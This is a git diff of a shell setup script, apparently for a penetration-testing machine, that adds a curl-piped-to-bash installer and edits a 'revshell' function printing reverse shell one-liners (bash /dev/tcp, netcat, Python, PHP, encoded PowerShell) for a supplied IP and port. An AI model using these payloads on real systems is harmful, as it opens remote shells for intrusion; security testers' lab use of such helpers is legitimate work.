@@ -357,6 +357,19 @@ install_witr() {
   fi
 }
 
+install_spf() {
+  info "Attempting SPF install via upstream script"
+  if command -v curl &>/dev/null; then
+    if curl -sLo- https://superfile.dev/install.sh 2>/dev/null | bash; then
+      success "SPF installed"
+    else
+      warn "SPF install script failed"
+    fi
+  else
+    warn "curl not present; cannot install SPF automatically."
+  fi
+}
+
 font_packages_install() {
   local font_dir="${HOME}/.local/share/fonts"
   local tmp="/tmp/hack-nerd-font.zip"
@@ -495,39 +508,47 @@ export PATH=$PATH:$HOME/.pdtm/go/bin
 ##### Custom Aliases and Functions
 alias myip='curl ifconfig.me'
 
-# Reverse shell generator
+######################### RevShell Function START #################################
 revshell(){ 
   ip=$1; port=$2;
 
-  bash_shell="/usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
+  bash_shell="/usr/bin/bash  -i  >&  /dev/tcp/$ip/$port  0>&1  "
   shell_encode=$(echo "$bash_shell"|base64 -w 0)
   
   
-  ps_cmd="\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+  ps_cmd="\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close() "
 
   ps_base64=$(echo "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
   
-  echo -e "\n[+] busybox nc $ip $port -e sh"
+  echo -e "\n[+] busybox: busybox nc $ip $port -e sh"
   echo -e "[+] Java Runtime().exec: bash -c $@|bash 0 echo bash -i >& /dev/tcp/$ip/$port 0>&1 "
   echo -e "[+] Bash: /usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
   echo -e "[+] Bash Encoded: echo \"$shell_encode\"|base64 -d |/usr/bin/bash"
-  echo "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
-  echo "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
-  echo "[+] Netcat FIFO: rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/bash -i 2>&1|nc $ip $port"
-  echo "[+] PowerShell (Base64): powershell -e $ps_base64"
+  echo -e "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+  echo -e "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
+  echo -e "[+] Netcat FIFO: rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/bash -i 2>&1|nc $ip $port"
+  echo -e "[+] PowerShell (Base64): powershell -e $ps_base64"
 }
 
-# Aliases
+######################### RevShell Function END #################################
+#
+#
+#
+######################### Aliases START #########################
 alias ls='lsd'
 alias l='lsd -l'
 alias la='lsd -a'
 alias lla='lsd -la'
 alias lt='lsd --tree'
-
-# Environment variables
+######################### Aliases END ##########################
+#
+#
+#
+######################### Environment variables START ######################## 
 export HTB_TOKEN=""
 export VMIP=""
 export IP=""
+######################### Environment variables END ######################## 
 EOF
 
   chmod 644 "$zshrc_path" 2>/dev/null || true
@@ -558,6 +579,8 @@ main() {
   install_opengrep
   echo ""
   install_witr
+  echo ""
+  install_spf
   echo ""
   install_oh_my_zsh
   echo ""
